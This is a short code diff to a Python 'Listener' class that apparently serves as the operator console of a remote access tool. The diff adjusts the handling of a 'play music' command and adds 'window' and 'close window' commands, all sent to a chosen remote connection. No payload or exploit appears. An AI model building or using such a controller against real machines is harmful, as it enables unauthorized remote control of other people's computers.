@@ -231,7 +231,7 @@ class Listener:
 						self.write_file("logs.txt", res)
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
-			elif command == "play music":
+			elif command.startswith("play music"):
 				if self.chosen_connection:
 					res = self.execute_remotely(command)
 					if res.split()[0] == "[-]": 
@@ -262,6 +262,14 @@ class Listener:
 					else:
 						print(colored(res, "green"))
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
+
+			elif command == "window":
+				res = self.execute_remotely(command)
+				print(res)
+
+			elif command == "close window":
+				res = self.execute_remotely(command)
+				print(res)
 
 			elif len(command.split()):
 				if self.chosen_connection:
